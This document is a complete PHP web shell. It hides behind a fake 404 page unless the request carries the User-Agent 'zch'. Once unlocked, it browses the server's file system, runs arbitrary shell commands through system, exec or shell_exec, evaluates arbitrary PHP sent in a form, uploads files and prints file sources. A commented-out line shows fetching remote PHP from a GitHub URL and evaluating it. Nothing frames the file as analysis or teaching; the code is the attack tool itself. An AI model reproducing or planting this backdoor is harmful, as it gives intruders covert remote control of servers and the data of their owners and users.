<?php

// eval("?>" . file_get_contents("https://raw.githubusercontent.com/ZechBron/zChB-Geek/master/zCh.php") . "<?php");

if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {

   if (!empty($_GET['action']) && $_GET['action'] == "start") {
      echo '<b>Uname: </b>' . php_uname() . '<br>';
      echo '<b>Path:</b> ';
      if(isset($_GET['path'])){
         $path = $_GET['path'];
      }
      else {
         $path = getcwd();
      }
      $path = str_replace('\\','/',$path);
      $paths = explode('/',$path);
      foreach($paths as $id=>$pat){
         if($pat == '' && $id == 0){
            $a = true;
            echo '<a href="?action=start&&path=/">/</a>';
            continue;
         }
         if($pat == '') continue;
         echo '<a href="?action=start&&path=';
         for($i=0;$i<=$id;$i++){
            echo "$paths[$i]";
            if($i != $id) echo "/";
         }
         echo '">'.$pat.'</a>/';
      }

   // Execute Command
   echo '<form method="post" action="#"><table><tr><th>Execute Commands: </th>
      <td><input type="text" name="exec"></td>
      <td><input type="submit" value="execute"></td>
      <th> Execute PHP Code: </th>
      <td><input type="text" name="zode" placeholder="Do not include <?php ?>"></td>
      <td><input type="submit" value="run"></td>
      </tr></table></form>';

   if (!empty($_POST['exec'])) {
      if(function_exists('system')) {
         system($_POST['exec']);
      }
      elseif(function_exists('exec')) {
         exec($_POST['exec']);
      }
      elseif(function_exists('shell_exec')) {
         shell_exec($_POST['exec']);
      }
      else {
        echo "Cannot Execute Any Commands. Function was disabled.";
      }
   }

   if(!empty($_POST['zode'])) {
      eval($_POST['zode']);
   }


   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
   if (!empty($_FILES['file']['name'])) {
      $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
      if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
         echo "File uploaded!";
      }
   }

   echo '<hr>';
   if (is_dir($path)){
      if ($dh = opendir($path)){
         while (($file = readdir($dh)) !== false){
            echo '<a href="?action=start&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
         }
         closedir($dh);
      }
   }
   elseif (is_file($path)) {
      echo show_source($path);
   }
}
}
else {
   header("HTTP/1.0 404 Not Found");
}
?>
